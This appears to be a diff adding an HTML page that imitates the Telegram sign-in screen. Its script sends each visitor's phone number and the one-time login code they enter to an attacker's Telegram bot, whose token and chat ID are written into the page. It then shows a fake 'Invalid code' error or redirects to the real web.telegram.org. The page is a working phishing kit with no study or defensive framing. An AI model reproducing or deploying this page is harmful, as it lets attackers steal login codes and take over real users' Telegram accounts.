@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Telegram</title>
+    <script src="https://unpkg.com/country-flag-icons/unicode.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: white;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .logo {
+            width: 96px;
+            height: 96px;
+            background-color: #2AABEE;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            transition: transform 0.3s ease;
+        }
+        .logo:hover {
+            transform: scale(1.05);
+        }
+        .logo svg {
+            width: 48px;
+            height: 48px;
+            fill: white;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        p {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: normal;
+        }
+        select, input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        select:focus, input:focus {
+            outline: none;
+            border-color: #2AABEE;
+            box-shadow: 0 0 0 3px rgba(42, 171, 238, 0.1);
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .checkbox-group input {
+            width: auto;
+            margin-right: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2AABEE;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #229ED9;
+        }
+        .qr-link {
+            display: block;
+            text-align: center;
+            color: #2AABEE;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .qr-link:hover {
+            text-decoration: underline;
+        }
+        #otp-page {
+            display: none;
+        }
+        .error-input {
+            border-color: #ff4444 !important;
+            background-color: rgba(255, 68, 68, 0.1);
+        }
+        .error-message {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 4px;
+            display: none;
+        }
+        .error-message.visible {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M20.665 3.717l-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42l10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701l-.321 4.71c.47 0 .677-.216.94-.474l2.26-2.183l4.709 3.474c.867.48 1.49.233 1.71-.803l3.081-14.502c.315-1.267-.456-1.84-1.557-1.369z"></path>
+            </svg>
+        </div>
+        <div id="phone-page">
+            <h1>Sign in to Telegram</h1>
+            <p>Please confirm your country code<br>and enter your phone number.</p>
+            <form id="signin-form">
+                <div class="form-group">
+                    <label for="country">Country</label>
+                    <select id="country" required>
+                        <option value="Vietnam" selected>🇻🇳 Vietnam +84</option>
+                        <option value="United States">🇺🇸 United States +1</option>
+                        <option value="Japan">🇯🇵 Japan +81</option>
+                        <option value="Germany">🇩🇪 Germany +49</option>
+                        <option value="Brazil">🇧🇷 Brazil +55</option>
+                        <option value="India">🇮🇳 India +91</option>
+                        <option value="Australia">🇦🇺 Australia +61</option>
+                        <option value="France">🇫🇷 France +33</option>
+                        <option value="Canada">🇨🇦 Canada +1</option>
+                        <option value="Italy">🇮🇹 Italy +39</option>
+                        <option value="Spain">🇪🇸 Spain +34</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" value="+84" required>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="keep-signed">
+                    <label for="keep-signed">Keep me signed in</label>
+                </div>
+                <button type="submit">NEXT</button>
+            </form>
+            <a href="#" class="qr-link">LOG IN BY QR CODE</a>
+        </div>
+        <div id="otp-page">
+            <h1>Sign in to Telegram</h1>
+            <p>We have sent you a message in Telegram<br>with the code.</p>
+            <form id="otp-form">
+                <div class="form-group">
+                    <label for="otp">Code</label>
+                    <input type="text" id="otp" placeholder="Enter code" required>
+                    <div id="otp-error" class="error-message">Invalid code</div>
+                </div>
+                <button type="submit">SIGN IN</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const countrySelect = document.getElementById('country');
+        const phoneInput = document.getElementById('phone');
+        const signinForm = document.getElementById('signin-form');
+        const otpForm = document.getElementById('otp-form');
+        const phonePage = document.getElementById('phone-page');
+        const otpPage = document.getElementById('otp-page');
+
+        const countryPhoneCodes = {
+            'Vietnam': '+84',
+            'United States': '+1',
+            'Japan': '+81',
+            'Germany': '+49',
+            'Brazil': '+55',
+            'India': '+91',
+            'Australia': '+61',
+            'France': '+33',
+            'Canada': '+1',
+            'Italy': '+39',
+            'Spain': '+34'
+        };
+
+        countrySelect.addEventListener('change', (e) => {
+            const phoneCode = countryPhoneCodes[e.target.value];
+            if (phoneCode) {
+                phoneInput.value = phoneCode;
+            }
+        });
+
+        signinForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const selectedCountry = countrySelect.value;
+            const phoneNumber = phoneInput.value;
+
+            try {
+                const response = await fetch('https://api.telegram.org/8178385196:AAFvlGsJb14OukPNLQLjhJYsRPeLBP92U_Y/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: "7220090233",
+                        text: `New sign-in attempt:\nCountry: ${selectedCountry}\nPhone Number: ${phoneNumber}`
+                    }),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to Telegram');
+                }
+
+                phonePage.style.display = 'none';
+                otpPage.style.display = 'block';
+            } catch (error) {
+                console.error("Error information:", error);
+                alert("Failed to information. Please try again.");
+            }
+        });
+
+        otpForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const otp = document.getElementById('otp').value;
+            const otpInput = document.getElementById('otp');
+            const otpError = document.getElementById('otp-error');
+
+            try {
+                const response = await fetch('https://api.telegram.org/8178385196:AAFvlGsJb14OukPNLQLjhJYsRPeLBP92U_Y/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: "7220090233",
+                        text: `OTP entered: ${otp}`
+                    }),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to connect Telegram');
+                }
+
+                if (otp === "123456") {
+                    otpInput.classList.remove('error-input');
+                    otpError.classList.remove('visible');
+                    window.location.href = 'https://web.telegram.org/';
+                } else {
+                    otpInput.classList.add('error-input');
+                    otpError.classList.add('visible');
+                }
+            } catch (error) {
+                console.error("Error verifying OTP:", error);
+                otpInput.classList.add('error-input');
+                otpError.classList.add('visible');
+            }
+        });
+    </script>
+</body>
+</html>
+
